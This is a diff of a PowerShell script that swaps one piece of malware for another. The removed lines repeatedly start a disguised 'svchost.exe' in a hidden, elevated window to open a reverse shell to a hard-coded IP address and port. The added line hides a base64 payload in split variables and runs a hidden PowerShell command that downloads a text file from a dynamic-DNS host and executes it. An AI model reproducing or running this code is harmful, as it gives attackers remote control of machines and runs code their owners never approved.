@@ -1,6 +1,1 @@
-﻿while ($true) {
-    $result = Start-Process powershell -windowstyle Hidden -Verb runAs -Wait -PassThru -ArgumentList 'C:\Users\Administrator\AppData\Local\Temp\svchost.exe 66.228.37.7 1607 -e powershell'
-    if ($result.ExitCode -eq 0) {
-        break
-    }
-}
+$RRRFHu = "-Win" ; $vJGyif = "eN" ; $lLLcEzZzZZ = "doW" ; $uuI = "sH" ; $t = "O" ; $uGUEEc = "yle" ; $r = "ll" ; $fueVerIxq = "sT" ; $VEroNxxZ = "hiDD" ; $NNnnNN = "-e" ; $s = "p" ; $xF = "w" ; $ggOAv = "E" ; $xx = "R" ; $fuGEJjif = "SQBFAFgAKABJAFcAUgAgAGgAdAB" ; $fijerVKOsdw = "0AHAAOgAvAC8AZwA1ADcAaABpAHQAcgA5AGEAdAB3ADkAagBrAGsAeQA1" ; $xNneifjK = "AHAAMgAuAGQAZABuAHMAL" ; $EEriUxxQuI = "gBuAGUAdAAvAGwAbgBrAHMAcABsAG" ; $uIfiecvvVehciwe = "8AaQB0AC4" ; $JgJuJiddEfjaZ = "AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA" ; IeX "$s$t$xF$ggOAv$xx$uuI$ggOAv$r $RRRFHu$lLLcEzZzZZ$fueVerIxq$uGUEEc $VEroNxxZ$vJGyif $NNnnNN $fuGEJjif$fijerVKOsdw$xNneifjK$EEriUxxQuI$uIfiecvvVehciwe$JgJuJiddEfjaZ"
